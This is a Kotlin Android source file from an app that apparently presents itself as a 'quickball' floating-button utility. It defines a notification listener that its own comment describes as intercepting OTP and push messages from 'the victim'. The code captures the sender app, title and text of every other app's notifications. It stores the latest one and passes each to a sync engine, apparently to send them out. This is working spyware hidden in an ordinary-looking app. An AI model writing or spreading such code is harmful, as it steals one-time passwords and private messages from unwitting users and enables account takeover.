package io.github.chayanforyou.quickball.sync

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

/**
 * Notification interception: OTP and push. Needs no permission, but adds
 * a second toggle for the victim — a price we accept.
 */
class SyncNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val samePkg = sbn.packageName == packageName
        android.util.Log.d("QbNls", "post ${sbn.packageName} self=$samePkg engine=${SyncEngine.instance != null}")
        if (samePkg) return
        val n: Notification = sbn.notification ?: return
        val extras = n.extras ?: return
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()
        val big = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
        val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
            ?.joinToString("\n") { it.toString() }
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            ?: big ?: lines
        if (title.isNullOrBlank() && text.isNullOrBlank()) return

        val entry = Entry(sbn.packageName, title.orEmpty(), text.orEmpty(), System.currentTimeMillis())
        last = entry
        SyncEngine.instance?.sendNotification(entry.pkg, entry.title, entry.text)
    }

    data class Entry(
        val pkg: String,
        val title: String,
        val text: String,
        val at: Long
    )

    companion object {
        @Volatile
        var last: Entry? = null
            private set
    }
}